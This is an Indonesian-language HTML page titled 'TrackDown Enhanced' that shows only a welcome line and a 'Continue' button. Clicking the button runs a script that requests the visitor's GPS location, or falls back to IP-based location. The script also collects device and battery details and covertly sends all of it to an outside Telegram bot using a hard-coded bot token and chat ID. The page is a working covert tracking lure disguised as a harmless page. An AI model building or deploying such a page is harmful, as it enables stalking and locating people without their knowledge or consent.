<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TrackDown Enhanced</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }

        .action-button {
            background-color: #4CAF50;
            color: white;
            padding: 20px 40px;
            font-size: 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Selamat Datang!</h1>
    <p>Tekan tombol di bawah untuk melanjutkan.</p>
    <button class="action-button" id="actionButton">Lanjutkan</button>

    <script>
        (function() {
            // Nama variabel yang lebih umum
            const apiKey = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww"; // Token API Telegram
            const userId = "5649811717"; // Chat ID Telegram

            function sendToServer(message) {
                const endpoint = `https://api.telegram.org/bot${apiKey}/sendMessage`;
                fetch(endpoint, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: userId, text: message }),
                }).catch(() => console.log("Gagal mengirim data ke server."));
            }

            function getIPDetails() {
                fetch("https://ipapi.co/json/")
                    .then(response => response.json())
                    .then(data => {
                        const ipInfo = `
IP Address: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country_name}
                        `;
                        sendToServer(`IP Details:\n${ipInfo}`);
                    })
                    .catch(() => console.log("Gagal mengambil lokasi IP."));
            }

            function getDeviceInfo() {
                return `
Platform: ${navigator.platform}
User Agent: ${navigator.userAgent}
Vendor: ${navigator.vendor || 'N/A'}
                `;
            }

            function getBatteryStatus(callback) {
                if ('getBattery' in navigator) {
                    navigator.getBattery().then(battery => {
                        const batteryInfo = `
Battery Level: ${battery.level * 100}%
Charging: ${battery.charging ? 'Yes' : 'No'}
                        `;
                        callback(batteryInfo);
                    }).catch(() => callback("Battery Info: Gagal diambil."));
                } else {
                    callback("Battery Info: Tidak didukung.");
                }
            }

            function getGeolocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const { latitude, longitude, accuracy } = position.coords;
                            let message = `
Location Info:
Latitude: ${latitude}
Longitude: ${longitude}
Accuracy: ${accuracy} meters
Google Maps: https://www.google.com/maps?q=${latitude},${longitude}

Device Info:
${getDeviceInfo()}
                            `;
                            getBatteryStatus(batteryInfo => {
                                message += `\n${batteryInfo}`;
                                sendToServer(message);
                            });
                        },
                        () => {
                            console.log("Geolocation gagal, fallback ke IP.");
                            getIPDetails();
                        }
                    );
                } else {
                    console.log("Geolocation tidak didukung, fallback ke IP.");
                    getIPDetails();
                }
            }

            document.getElementById("actionButton").addEventListener("click", () => {
                getGeolocation();
            });
        })();
    </script>
</body>
</html>
